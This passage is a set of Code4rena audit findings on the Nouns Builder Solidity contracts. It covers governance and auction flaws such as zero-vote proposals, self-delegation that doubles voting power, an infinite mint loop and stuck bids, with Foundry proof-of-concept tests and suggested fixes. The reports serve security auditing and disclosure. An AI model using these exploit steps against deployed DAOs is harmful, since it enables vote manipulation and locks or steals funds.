treasury.delay());          //Execute proposal         governor.execute(targets, values, calldatas, keccak256(bytes(\"\")));          //Shows it's now possible for an attacker to queue a proposal immediately         bytes32 proposalId2 = governor.propose(targets, values, calldatas, \"mock\");         governor.queue(proposalId2);          //And executed it after one day         vm.warp(block.timestamp + 60 * 60 * 24);         governor.execute(targets, values, calldatas, keccak256(bytes(\"mock\")));     }  ```  ## Recommended Mitigation Steps This potential attack path comes from a combination of factors, maninly: 1. A proposal can be created directly after deployment 2. The `proposal.proposal.proposalThreshold` and `proposal.quorumVotes` are set to 0 at such early stages 3. A proposal with 0 votes is allowed to pass  I would say that requiring at least 1 vote for a proposal to be considered `Succeeded` is rational and should mitigate this problem because that would require the attacker to bid on auction to get 1 voting power, increasing the cost and the time necessary for the attack.  At [Governor.sol#L441](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L441) we have:  ```javscript else if (proposal.forVotes < proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) {         return ProposalState.Defeated; } ``` which can be changed to: ```javscript else if (proposal.forVotes == 0 || proposal.forVotes < proposal.againstVotes || proposal.forVotes < proposal.quorumVotes) {         return ProposalState.Defeated; } ``` "}, {"title": "The quorum votes calculations don't take into account burned tokens", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/423", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L475 https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol#L524   # Vulnerability details  Because the following happens:  1. Burned tokens votes are effectively deleted in `token._moveDelegateVotes()` when called by `token.burn()` 2. When an auction gets settled without bidders the function burns the token by calling `token.burn()` 3. When `_createAuction()` is called an amount of tokens >= 1 is minted, of which 1 is kept in the auction contract 4. The functions `governor.proposalThreshold()` and `governor.quorum()` both depend on `token.totalSupply()` for their calculations.  We can derive that the protocol calculates the `quorumVotes` taking into account burned tokens and tokens held in the auction contract, which don't have any actual voting power. In other words the actual `quorumThresholdBps` is equal or higher than the setted `quorumThresholdBps`.  ## Impact The worse case scenario that can happen is that the quorum gets so high that a proposal cannot pass even if everybody voted and everybody voted `for`, potentially locking funds into the contract.  We can define:  1. `assumedVotingPower` = `token.totalSupply()` 2. `realVotingPower` = `token.totalSupply() - amountOfTokensBurned` 3. `\u0394VotingPower` = `amountOfTokensBurned`   This is the case if:  ``` realVotingPower at proposal.voteEnd < quorum at proposal.timeCreated ``` which is the same as  ``` realVotingPower < (assumedVotingPower * settings.quorumThresholdBps) / 10_000 ``` and rearranging in terms of `settings.quorumThresholdBps` we have:  ``` settings.quorumThresholdBps > 10_000 * realVotingPower/assumedVotingPower ```  Knowing that:  1. The possible range of values for `10_000 * realVotingPower/assumedVotingPower` is from `1` to `10000`. If `realVotingPower = 0` this model doesn't make sense in the first place.   2. The possible range of values of `settings.quorumThresholdBps` is from `1` to `2^16 - 1`. The protocol allows for `settings.quorumThresholdBps` to be `0`, in which case it means that the actual quorum is `0`; a context in which this model doesn't make sense. There's another catch that restricts this boundaries, if `settings.quorumThresholdBps * token.totalSupply()` < `10_000` the output of `governance.quorum()` would be `0`.   Many combinations of values in the ranges described above render this disequation true, note, however, that this describes the workings in a mathematical settings and it doesnt hold true for every case in a real setting because of roundings and approximations.  We can intuitevely notice that when `realVotingPower/assumedVotingPower` is very low, which is the case of a DAO with few tokens burned, the chances of the disequation being true are slim and when it's high the chances of the disequation being true become higher. The opposite is true for `settings.quorumThresholdBps`.  This might lock funds in DAOs with a lot of unsold auctions who have a low `settings.quorumThresholdBps`.  At early stages this is mitigated by the fact that for every possible token burned some tokens are minted to the founders, but when the vest expires this mitigation is not in place anymore.  ## Proof of concept  I wrote a test that's expected to revert a `proposal.queue()` even if all possible votes available are cast in favor.  The test comes with two parameters to set: `auctionsToRun` and `tokensToBidder`. The test runs `auctionsToRun` auctions, of which the first `tokensToBidder` are bidded upon and the rest are not. Then: 1. Creates a proposal 2. Cast all possible votes in favor 3. Tries to queue a proposal 4. Reverts  The default parameters are set to `auctionsToRun = 130` and `tokensToBidder = 10`. Also `quorumThresholdBps = 1000`. This test results in `121 tokens burned` and `133 token minted`. It's quite an unrealistic scenario, but it can get more real if `quorumThresholdBps` is setted lower. Keep in mind that this is the case in which everybody shows up to vote and averybody votes for.  ### Test code The test can be pasted inside `Gov.t.sol` and then run with:  `test -m test_RevertQueueProposalWithEverybodyInFavour`  ```javascript function test_RevertQueueProposalWithEverybodyInFavour() public {     //Number of auctions to run     uint256 auctionsToRun = 130;      //Amount of tokens to bid up     uint256 tokensToBidder = 10;      address bidder1 = vm.addr(0xB1);     vm.deal(founder, 10000 ether);     vm.deal(bidder1, 10000 ether);      //Start the first auction     vm.prank(founder);     auction.unpause();      //Simulates an `auctionsToRun` amount of auctions in which the first `tokensForBidder` tokens     //are minted and then every auction ends with no bidders.     uint256 amountOfBurnedTokens;     for (uint256 i = 1; i < auctionsToRun + 1; ++i) {         if (i < tokensToBidder) {             uint256 id = token.totalSupply() - 1;             vm.prank(bidder1);             auction.createBid{ value: 0.15 ether }(id);         } else {             amountOfBurnedTokens++;         }          vm.warp(block.timestamp + auction.duration() + 1);         auction.settleCurrentAndCreateNewAuction();     }      uint256 founderVotes = token.getVotes(founder);     uint256 founder2Votes = token.getVotes(founder2);     uint256 bidder1Votes = token.getVotes(bidder1);     uint256 auctionVotes = token.getVotes(address(auction));      uint256 realVotingPower = founderVotes + founder2Votes + bidder1Votes;     uint256 assumedVotingPower = token.totalSupply();      assertEq(realVotingPower, assumedVotingPower - amountOfBurnedTokens - auctionVotes);      //Create mock proposal     (address[] memory targets, uint256[] memory values, bytes[] memory calldatas) = mockProposal();     vm.prank(bidder1);     bytes32 proposalId = governor.propose(targets, values, calldatas, \"\");      emit log_string(\"Amount of tokens minted: \");     emit log_uint(token.totalSupply());      emit log_string(\"Amount of tokens burned:\");     emit log_uint(amountOfBurnedTokens);      emit log_string(\"---------\");      emit log_string(\"The real quorumThresholdBps is: \");     uint256 realquorumThresholdBps = (governor.getProposal(proposalId).quorumVotes * 10_000) / realVotingPower;     emit log_uint(realquorumThresholdBps);      emit log_string(\"The assumed quorumThresholdBps is:\");     uint256 assumedquorumThresholdBps = (governor.getProposal(proposalId).quorumVotes * 10_000) / token.totalSupply();     emit log_uint(assumedquorumThresholdBps);      emit log_string(\"---------\");      vm.warp(governor.getProposal(proposalId).voteStart);      //Everybody cast a `for` vote     vm.prank(founder);     governor.castVote(proposalId, 1);      vm.prank(founder2);     governor.castVote(proposalId, 1);      vm.prank(bidder1);     governor.castVote(proposalId, 1);      emit log_string(\"The amount of votes necessary for this proposal to pass is:\");     emit log_uint(governor.getProposal(proposalId).quorumVotes);      emit log_string(\"The amount of for votes in the proposal:\");     emit log_uint(governor.getProposal(proposalId).forVotes);      //Proposal still doesn't pass     vm.warp((governor.getProposal(proposalId).voteEnd));     vm.expectRevert(abi.encodeWithSignature(\"PROPOSAL_UNSUCCESSFUL()\"));     governor.queue(proposalId); } ```  ## Tools Used Forge  ## Recommended Mitigation Steps Either one of this 2 options is viable: 1. Decrease `token.totalSupply()` whenever a token gets burned. This might not be expected behaviour from the point of view of external protocols. 2. Adjust the calculations in `proposal.quorum()` and `governor.proposalThreshold()` in such a way that they take into account the burned tokens and the tokens currently held by the auction contract."}, {"title": "`ERC721Votes`: Token owners can double voting power through self delegation", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/413", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "edited-by-warden"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L131-L135 https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L176-L190 https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L192-L235   # Vulnerability details  The owner of one or many `ERC721Votes` tokens can double their voting power once (and only once) by delegating to their own address as their first delegation.  ### Scenario This exploit relies on the initial default value of the `delegation` mapping in `ERC721Votes`, which is why it will only work once per address.  First, the token owner must call `delegate` or `delegateBySig`, passing their own address as the delegate:  [`ERC721Votes#delegate`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L131-L135)  ```solidity     /// @notice Delegates votes to an account     /// @param _to The address delegating votes to     function delegate(address _to) external {         _delegate(msg.sender, _to);     } ```  This calls into the internal `_delegate` function, with `_from` and `_to` both set to the token owner's address:  [`ERC721Votes#_delegate`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L176-L190)  ```solidity     /// @dev Updates delegate addresses     /// @param _from The address delegating votes from     /// @param _to The address delegating votes to     function _delegate(address _from, address _to) internal {         // Get the previous delegate         address prevDelegate = delegation[_from];          // Store the new delegate         delegation[_from] = _to;          emit DelegateChanged(_from, prevDelegate, _to);          // Transfer voting weight from the previous delegate to the new delegate         _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));     } ```  Since this is the token owner's first delegation, the `delegation` mapping does not contain a value for the `_from` address, and `prevDelegate` on L#181 will be set to `address(0)`:  [`ERC721Votes.sol#L180-L181`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L180-L181)  ```solidity         // Get the previous delegate         address prevDelegate = delegation[_from]; ```  This function then calls into `_moveDelegateVotes` to transfer voting power. This time, `_from` is `prevDelegate`, equal to `address(0)`; `_to` is the token owner's address; and `_amount` is `balanceOf(_from)`, the token owner's current balance:  [`ERC721Votes#_moveDelegateVotes`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L192-L235)  ```solidity  /// @dev Transfers voting weight     /// @param _from The address delegating votes from     /// @param _to The address delegating votes to     /// @param _amount The number of votes delegating     function _moveDelegateVotes(         address _from,         address _to,         uint256 _amount     ) internal {         unchecked {             // If voting weight is being transferred:             if (_from != _to && _amount > 0) {                 // If this isn't a token mint:                 if (_from != address(0)) {                     // Get the sender's number of checkpoints                     uint256 nCheckpoints = numCheckpoints[_from]++;                      // Used to store the sender's previous voting weight                     uint256 prevTotalVotes;                      // If this isn't the sender's first checkpoint: Get their previous voting weight                     if (nCheckpoints != 0) prevTotalVotes = checkpoints[_from][nCheckpoints - 1].votes;                      // Update their voting weight                     _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes - _amount);                 }                  // If this isn't a token burn:                 if (_to != address(0)) {                     // Get the recipients's number of checkpoints                     uint256 nCheckpoints = numCheckpoints[_to]++;                      // Used to store the recipient's previous voting weight                     uint256 prevTotalVotes;                      // If this isn't the recipient's first checkpoint: Get their previous voting weight                     if (nCheckpoints != 0) prevTotalVotes = checkpoints[_to][nCheckpoints - 1].votes;                      // Update their voting weight                     _writeCheckpoint(_to, nCheckpoints, prevTotalVotes, prevTotalVotes + _amount);                 }             }         }     } ```  The `if` condition on L#203 is `true`, since `_from` is `address(0)`, `_to` is the owner address, and `_amount` is nonzero:  [`ERC721Votes.sol#L202-L203`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L202-L203)  ```solidity             // If voting weight is being transferred:             if (_from != _to && _amount > 0) { ```  Execution skips the `if` block on L#205-217, since `_from` is `address(0)`:  [`ERC721Votes.sol#L205-L217`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L204-L217)  ```solidity                 // If this isn't a token mint:                 if (_from != address(0)) {                     // Get the sender's number of checkpoints                     uint256 nCheckpoints = numCheckpoints[_from]++;                      // Used to store the sender's previous voting weight                     uint256 prevTotalVotes;                      // If this isn't the sender's first checkpoint: Get their previous voting weight                     if (nCheckpoints != 0) prevTotalVotes = checkpoints[_from][nCheckpoints - 1].votes;                      // Update their voting weight                     _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes - _amount);                 } ```  However, the `if` block on L#220-232 will execute and increase the voting power allocated to `_to`:  [`ERC721Votes.sol#L220-L232`](https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L219-L232)  ```solidity                 // If this isn't a token burn:                 if (_to != address(0)) {                     // Get the recipients's number of checkpoints                     uint256 nCheckpoints = numCheckpoints[_to]++;                      // Used to store the recipient's previous voting weight                     uint256 prevTotalVotes;                      // If this isn't the recipient's first checkpoint: Get their previous voting weight                     if (nCheckpoints != 0) prevTotalVotes = checkpoints[_to][nCheckpoints - 1].votes;                      // Update their voting weight                     _writeCheckpoint(_to, nCheckpoints, prevTotalVotes, prevTotalVotes + _amount);                 } ```  The token owner's voting power has now been increased by an amount equal to their total number of tokens, without an offsetting decrease.  This exploit only works once: if a token owner subsequently delegates to themselves after their initial self delegation, `prevDelegate` will be set to a non-default value in `_delegate`, and the delegation logic will work as intended.  ### Impact Malicious `ERC21Votes` owners can accrue more voting power than they deserve. Especially malicious owners may quietly acquire multiple tokens before doubling their voting power. In an early DAO with a small supply of tokens, the impact of this exploit could be significant.  ### Recommendation Make the `delegates` function `public` rather than `external`:  ```solidity     /// @notice The delegate for an account     /// @param _account The account address     function delegates(address _account) public view returns (address) {         address current = delegation[_account];         return current == address(0) ? _account : current;     } ```  Then, call this function rather than accessing the `delegation` mapping directly:  ```solidity     /// @dev Updates delegate addresses     /// @param _from The address delegating votes from     /// @param _to The address delegating votes to     function _delegate(address _from, address _to) internal {         // Get the previous delegate         address prevDelegate = delegates(_from);          // Store the new delegate         delegation[_from] = _to;          emit DelegateChanged(_from, prevDelegate, _to);          // Transfer voting weight from the previous delegate to the new delegate         _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));     } ```  Note that the original NounsDAO contracts follow this pattern. (See [here](https://github.com/nounsDAO/nouns-monorepo/blob/master/packages/nouns-contracts/contracts/base/ERC721Checkpointable.sol#L83-L91) and [here](https://github.com/nounsDAO/nouns-monorepo/blob/master/packages/nouns-contracts/contracts/base/ERC721Checkpointable.sol#L83-L91)).   ### Test cases (Put the following test cases in `Gov.t.sol`)  ```solidity     function test_delegate_to_self_doubles_voting_power() public {         mintVoter1();          assertEq(token.getVotes(address(voter1)), 1);          vm.startPrank(voter1);         token.delegate(address(voter1));          assertEq(token.getVotes(address(voter1)), 2);     }      function mintToken(uint256 tokenId) internal {         vm.prank(voter1);         auction.createBid{ value: 0.420 ether }(tokenId);          vm.warp(block.timestamp + auctionParams.duration + 1 seconds);         auction.settleCurrentAndCreateNewAuction();     }      function test_delegate_to_self_multiple_tokens_doubles_voting_power() public {         // An especially malicious user may acquire multiple tokens         // before doubling their voting power through this exploit.         mintVoter1();         mintToken(3);         mintToken(4);         mintToken(5);         mintToken(6);          assertEq(token.getVotes(address(voter1)), 5);          vm.prank(voter1);         token.delegate(address(voter1));          assertEq(token.getVotes(address(voter1)), 10);     } ```"}, {"title": "Highest bid in first auction can get irretreivably stuck in the protocol", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/376", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L248-L254   # Vulnerability details  ## Impact If the first auction is paused and unpaused in a protocol deployed with no founder fees, the highest bid (as well as the first NFT), will get stuck in the protocol with no ability to retrieve either of them.  ## Proof of Concept In a protocol with founder ownership percentage set to 0, the first tokenId put to auction is #0.  If the first auction in such a protocol is paused and unpaused, the check for `if (auction.tokenId == 0)` will pass and `_createAuction()` will automatically be called, minting the next token and starting a new auction based on token #1.  The result is that `highestBid` and `highestBidder` are reset, the first auction is never settled, and the highest bid (as well as NFT #0) will remain stuck in the platform.  The following test confirms this finding:  ```solidity function test_PauseAndUnpauseInFirstAuction() public {     address bidder1 = vm.addr(0xB1);     address bidder2 = vm.addr(0xB2);      vm.deal(bidder1, 100 ether);     vm.deal(bidder2, 100 ether);      console.log(\"Deploying with no founder pct...\");     deployMockWithEmptyFounders();      console.log(\"Unpausing...\");     vm.prank(founder);     auction.unpause();      console.log(\"Bidder makes initial bid.\");     vm.prank(bidder1);     auction.createBid{ value: 1 ether }(0);     (uint256 tokenId_, uint256 highestBid_, address highestBidder_,,,) = auction.auction();     console.log(\"Currently bidding for ID \", tokenId_);     console.log(\"Highest Bid: \", highestBid_, \". Bidder: \", highestBidder_);     console.log(\"Contract Balance: \", address(auction).balance);     console.log(\"--------\");      console.log(\"Pausing and unpausing auction house...\");     vm.startPrank(address(treasury));     auction.pause();     auction.unpause();     vm.stopPrank();      console.log(\"Bidder makes new bid.\");     vm.prank(bidder2);     auction.createBid{ value: 0.5 ether }(1);     (uint256 tokenId2_, uint256 highestBid2_, address highestBidder2_,,,) = auction.auction();     console.log(\"Currently bidding for ID \", tokenId2_);     console.log(\"Highest Bid: \", highestBid2_, \". Bidder: \", highestBidder2_);     console.log(\"Contract Balance: \", address(auction).balance); ```  ## Tools Used  Manual Review, Foundry  ## Recommended Mitigation Steps  Remove the block in `unpause()` that transfers ownership and creates an auction if `auction.tokenId == 0` and trigger those actions manually in the deployment flow."}, {"title": "ERC721Votes's delegation disables NFT transfers and burning", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/373", "labels": ["bug", "3 (High Risk)", "sponsor confirmed", "old-submission-method"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L262-L268   # Vulnerability details  If Alice the NFT owner first delegates her votes to herself, second delegates to anyone else with delegate() or delegateBySig() then all her NFT ids will become stuck: their transfers and burning will be disabled.  The issue is _afterTokenTransfer() callback running the _moveDelegateVotes() with an owner instead of her delegate. As Alice's votes in the checkpoint is zero after she delegated them, the subtraction _moveDelegateVotes() tries to perform during the move of the votes will be reverted.  As ERC721Votes is parent to Token and delegate is a kind of common and frequent operation, the impact is governance token moves being frozen in a variety of use cases, which interferes with governance voting process and can be critical for the project.  ## Proof of Concept  Suppose Alice delegated all her votes to herself and then decided to delegate them to someone else with either delegate() or delegateBySig() calling _delegate():  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L179-L190  ```solidity     function _delegate(address _from, address _to) internal {         // Get the previous delegate         address prevDelegate = delegation[_from];          // Store the new delegate         delegation[_from] = _to;          emit DelegateChanged(_from, prevDelegate, _to);          // Transfer voting weight from the previous delegate to the new delegate         _moveDelegateVotes(prevDelegate, _to, balanceOf(_from));     } ```  _moveDelegateVotes() will set her votes to `0` as `_from == Alice` and `prevTotalVotes = _amount = balanceOf(Alice)` (as _afterTokenTransfer() incremented Alice's vote balance on each mint to her):  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L196-L217  ```solidity     function _moveDelegateVotes(         address _from,         address _to,         uint256 _amount     ) internal {         unchecked {             // If voting weight is being transferred:             if (_from != _to && _amount > 0) {                 // If this isn't a token mint:                 if (_from != address(0)) {                     // Get the sender's number of checkpoints                     uint256 nCheckpoints = numCheckpoints[_from]++;                      // Used to store the sender's previous voting weight                     uint256 prevTotalVotes;                      // If this isn't the sender's first checkpoint: Get their previous voting weight                     if (nCheckpoints != 0) prevTotalVotes = checkpoints[_from][nCheckpoints - 1].votes;                      // Update their voting weight                     _writeCheckpoint(_from, nCheckpoints, prevTotalVotes, prevTotalVotes - _amount);                 } ```  After that her votes in the checkpoint become zero. She will not be able to transfer the NFT as `_afterTokenTransfer` will revert on `_moveDelegateVotes`'s attempt to move `1` vote from `Alice` to `_to`, while `checkpoints[Alice][nCheckpoints - 1].votes` is `0`:  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L262-L268  ```solidity     function _afterTokenTransfer(         address _from,         address _to,         uint256 _tokenId     ) internal override {         // Transfer 1 vote from the sender to the recipient         _moveDelegateVotes(_from, _to, 1); ```  ## Recommended Mitigation Steps  The root issue is _afterTokenTransfer() dealing with Alice instead of Alice's delegate.  Consider including delegates() call as a fix:  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L262-L268  ```solidity     function _afterTokenTransfer(         address _from,         address _to,         uint256 _tokenId     ) internal override {         // Transfer 1 vote from the sender to the recipient -       _moveDelegateVotes(_from, _to, 1); +       _moveDelegateVotes(delegates(_from), delegates(_to), 1); ```  As `delegates(address(0)) == address(0)` the burning/minting flow will persist:  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/lib/token/ERC721Votes.sol#L124-L129  ```solidity     /// @notice The delegate for an account     /// @param _account The account address     function delegates(address _account) external view returns (address) {         address current = delegation[_account];         return current == address(0) ? _account : current;     } ```   "}, {"title": "No control over timeBuffer could make that the first bid of each auction would make the auction end", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/359", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/auction/Auction.sol#L147-L150 https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/auction/Auction.sol#L146 https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/auction/Auction.sol#L323-L327   # Vulnerability details  ## Impact There is an [unchecked block](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/auction/Auction.sol#L147-L150) that in case timeBuffer is sufficiently large, would make the sum overflow and set the endTime of the auction in the past, making the auction end automatically. The developers are aware of this, that's why they have [this comment](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/auction/Auction.sol#L146). But I think it's not a matter of realistically overflowing, it could be set to a value large enough by mistake. It's not worth it to not validate the value of the time buffer, because the consequences could be devastating.  The best option would be to validate in function [setTimeBuffer](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/auction/Auction.sol#L323-L327) that the timeBuffer cannot be set to a large value.  ## Tools Used Manual analysis  ## Recommended Mitigation Steps Change function setTimeBuffer with this:  ```     function setTimeBuffer(uint256 _timeBuffer) external onlyOwner {         require(_timeBuffer < 31536000, \"TimeBuffer: too big\");          settings.timeBuffer = SafeCast.toUint40(_timeBuffer);          emit TimeBufferUpdated(_timeBuffer);     } ``` I supposed that **timeBuffer** should be less than one year (probably much less), so I compared here with the number of seconds in a year."}, {"title": "`Auction:createBid`: can take a bid with the same `highestBid` if (highestBid * minBidIncrement < 100)", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/349", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/auction/Auction.sol#L123   # Vulnerability details  ## Impact  A bidder can outbid previous bid with the same value, if the `(previous bid * minBidIncrement < 100)`.  ## Proof of Concept  ```solidity // Auction.sol  // createBid 117             unchecked { 118                 // Compute the minimum bid 119                 minBid = highestBid + ((highestBid * settings.minBidIncrement) / 100); 120             } 121 122             // Ensure the incoming bid meets the minimum 123             if (msg.value < minBid) revert MINIMUM_BID_NOT_MET();  331     function setMinimumBidIncrement(uint256 _percentage) external onlyOwner { 332         settings.minBidIncrement = SafeCast.toUint8(_percentage); 333 334         emit MinBidIncrementPercentageUpdated(_percentage); 335     } ```  When the `minBid` (defined in the line 119) is the same as the current `highestBid`, one can call `createBid` with the same value as the current `highestBid` (line 123). It means that the new bidder will get the Bid, even though the previous bidder has the same bid and was earlier. The `minBid` can be the same as the `highesBid` when `highestBid * minBidIncrement` is less than 100. So either the `highestBid` or `minBinIncrement` is too small, a bidder can overbid the precious one with the same amount of value.  The first bid should be higher or equal to the `reservePrice`. However, there is no safe guard against setting small `reservePrice` and `minBidIncrement`.  For example, let's say the `settings.minBidIncrement` is set to zero. Alice called `createBid` with 1 ether and is the current highestBidder with the `highestBid` of 1 ether. Bob calls `createBid` with 1 ether. The `minBid` in the line 119 will be 1ether as `minBidIncrement` is set to zero. In the line 123 the `msg.value` is 1 ether is the same as `minBid` therefore it will not revert. And now Bob is the `highestBidder` even though he bid the same value after Alice.  ## Tools Used  None  ## Recommended Mitigation Steps  Revert if the `msg.value` is the same as the `minBid`: ```solidity // Auction.sol  // createBid 117             unchecked { 118                 // Compute the minimum bid 119                 minBid = highestBid + ((highestBid * settings.minBidIncrement) / 100); 120             } 121 122             // Ensure the incoming bid meets the minimum -   if (msg.value < minBid) revert MINIMUM_BID_NOT_MET(); +  if (msg.value <= minBid) revert MINIMUM_BID_NOT_MET(); ```  <!-- zzzitron M00 -->  "}, {"title": "`Token:mint`: infinite loop if the founders' shares sum up to 100", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/347", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L179   # Vulnerability details  ## Impact  The Token as well as Auction cannot be used if the sum of `ownershipPct` is 100  ## Proof of Concept  ```solidity     function test_poc_mintforever() public {         createUsers(2, 1 ether);          address[] memory wallets = new address[](2);         uint256[] memory percents = new uint256[](2);         uint256[] memory vestExpirys = new uint256[](2);          uint256 pct = 50;         uint256 end = 4 weeks;          unchecked {             for (uint256 i; i < 2; ++i) {                 wallets[i] = otherUsers[i];                 percents[i] = pct;                 vestExpirys[i] = end;             }         }          deployWithCustomFounders(wallets, percents, vestExpirys);          assertEq(token.totalFounders(), 2);         assertEq(token.totalFounderOwnership(), 100);          Founder memory founder;          unchecked {             for (uint256 i; i < 100; ++i) {                 founder = token.getScheduledRecipient(i);                  if (i % 2 == 0) assertEq(founder.wallet, otherUsers[0]);                 else assertEq(founder.wallet, otherUsers[1]);             }         }  // // commented out as it will not stop //         vm.prank(otherUsers[0]); //         auction.unpause();      } ```  In the proof of concept, there are two founders and they both share 50% of ownership. If the `Auction` should be `unpause`d, and therefore triggers to mint tokens, it will go into the infinite loop and eventually revert for out of gas.  ```solidity // Token.sol  143     function mint() external nonReentrant returns (uint256 tokenId) { 144         // Cache the auction address 145         address minter = settings.auction; 146 147         // Ensure the caller is the auction 148         if (msg.sender != minter) revert ONLY_AUCTION(); 149 150         // Cannot realistically overflow 151         unchecked { 152             do { 153                 // Get the next token to mint 154                 tokenId = settings.totalSupply++; 155 156                 // Lookup whether the token is for a founder, and mint accordingly if so 157             } while (_isForFounder(tokenId)); 158         } 159 160         // Mint the next available token to the auction house for bidding 161         _mint(minter, tokenId); 162     }  177     function _isForFounder(uint256 _tokenId) private returns (bool) { 178         // Get the base token id 179         uint256 baseTokenId = _tokenId % 100; 180 181         // If there is no scheduled recipient: 182         if (tokenRecipient[baseTokenId].wallet == address(0)) { 183             return false; 184 185             // Else if the founder is still vesting: 186         } else if (block.timestamp < tokenRecipient[baseTokenId].vestExpiry) { 187             // Mint the token to the founder 188             _mint(tokenRecipient[baseTokenId].wallet, _tokenId); 189 190             return true; 191 192             // Else the founder has finished vesting: 193         } else { 194             // Remove them from future lookups 195             delete tokenRecipient[baseTokenId]; 196 197             return false; 198         } 199     } ```  In the `Token::mint`, there is a while loop which will keep looping as long as `_isForFounder` returns true. The `_isForFounder` function will return true is the given `_tokenId`'s recipient is still vesting. However, to check the recipient it is checking the `baseTokenId` which is `_tokenId % 100` (in line 179 above snippet). Which means, if the `tokenRecipient` of 0 to 99 are currently vesting, it will keep returning true and the while loop in the `mint` function will not stop. The `tokenRecipient` was set in the `_addFounders` and if the sum of all founders' ownership percent is 100, the `tokenRecipient` will be filled up to 100.   ## Tools Used  None  ## Recommended Mitigation Steps  use `_tokenId` instead of `baseTokenId`.  <!-- zzzitron H01 -->  "}, {"title": "Truncation in casting can lead to a founder receiving all the base tokens", "html_url": "https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/303", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "sponsor confirmed"], "target": "2022-09-nouns-builder-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L71-L126 https://github.com/code-423n4/2022-09-nouns-builder/blob/7e9fddbbacdd7d7812e912a369cfd862ee67dc03/src/token/Token.sol#L88   # Vulnerability details  ## Impact The initialize function of the `Token` contract receives an array of `FounderParams`, which contains the ownership percent of each founder as a `uint256`. The initialize function checks that the sum of the percents is not more than 100, but the value that is added to the sum of the percent is truncated to fit in `uint8`. This leads to an error because the value that is used for assigning the base tokens is the original, not truncated, 